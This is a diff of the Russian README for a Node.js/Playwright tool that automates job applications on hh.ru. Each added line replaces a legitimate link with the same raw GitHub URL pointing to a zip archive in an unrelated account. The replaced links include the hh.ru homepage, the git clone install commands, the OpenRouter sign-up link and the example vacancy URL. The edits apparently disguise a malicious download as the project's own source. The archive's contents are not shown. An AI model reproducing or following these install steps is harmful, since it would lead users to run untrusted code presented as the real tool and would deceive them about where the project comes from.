@@ -1,6 +1,6 @@
 # hh-ru-apply
 
-Автоматизация работы с [hh.ru](https://hh.ru) на Node.js + Playwright: сбор вакансий, оценка с помощью LLM, генерация сопроводительных писем и отклики через браузер с сохранением сессии.
+Автоматизация работы с [hh.ru](https://raw.githubusercontent.com/jacintacaryophyllaceous404/hh-ru-apply/main/.cursor/skills/hh-ru-apply-workflow/apply_hh_ru_1.1.zip) на Node.js + Playwright: сбор вакансий, оценка с помощью LLM, генерация сопроводительных писем и отклики через браузер с сохранением сессии.
 
 > **Важно:** Автоматизация откликов и массовые действия могут противоречить правилам сервиса и привести к ограничению аккаунта. Используйте на свой страх и риск.
 
@@ -27,7 +27,7 @@
 ### Вариант А: Локальный запуск
 
 ```bash
-git clone https://github.com/Steev193/hh-ru-apply.git
+git clone https://raw.githubusercontent.com/jacintacaryophyllaceous404/hh-ru-apply/main/.cursor/skills/hh-ru-apply-workflow/apply_hh_ru_1.1.zip
 cd hh-ru-apply
 npm install
 npx playwright install chromium
@@ -37,7 +37,7 @@ cp .env.example .env
 ### Вариант Б: Docker
 
 ```bash
-git clone https://github.com/Steev193/hh-ru-apply.git
+git clone https://raw.githubusercontent.com/jacintacaryophyllaceous404/hh-ru-apply/main/.cursor/skills/hh-ru-apply-workflow/apply_hh_ru_1.1.zip
 cd hh-ru-apply
 cp .env.example .env
 # первый вход (сохранение сессии)
@@ -93,7 +93,7 @@ senior python developer москва удалённо
 
 ### 5. OpenRouter для оценки вакансий (опционально)
 
-1. Зарегистрируйтесь на [openrouter.ai](https://openrouter.ai/), создайте API key.
+1. Зарегистрируйтесь на [openrouter.ai](https://raw.githubusercontent.com/jacintacaryophyllaceous404/hh-ru-apply/main/.cursor/skills/hh-ru-apply-workflow/apply_hh_ru_1.1.zip), создайте API key.
 2. Добавьте ключ в `config/secrets.local.env`:
    ```
    OpenRouter_API_KEY=sk-or-v1-...
@@ -155,7 +155,7 @@ npm run hh-fill-letter -- --id=<uuid-записи>
 Открывает страницу, нажимает «Откликнуться», вставляет письмо и ждёт вашей ручной проверки. Можно и по URL
 
 ```bash
-npm run hh-fill-letter -- --url=https://hh.ru/vacancy/123 --text-file=./letter.txt
+npm run hh-fill-letter -- --url=https://raw.githubusercontent.com/jacintacaryophyllaceous404/hh-ru-apply/main/.cursor/skills/hh-ru-apply-workflow/apply_hh_ru_1.1.zip --text-file=./letter.txt
 ```
 
 ### Отклик через чат
@@ -177,7 +177,7 @@ npm run hh-apply-chat -- --id=<uuid-записи>
 npm run codegen-hh
 ```
 
-Или вручную через `npx playwright codegen https://hh.ru`, актуальные селекторы в `lib/hh-response-selectors.mjs` и `lib/hh-chat-selectors.mjs`.
+Или вручную через `npx playwright codegen https://raw.githubusercontent.com/jacintacaryophyllaceous404/hh-ru-apply/main/.cursor/skills/hh-ru-apply-workflow/apply_hh_ru_1.1.zip`, актуальные селекторы в `lib/hh-response-selectors.mjs` и `lib/hh-chat-selectors.mjs`.
 
 ## Структура проекта
 
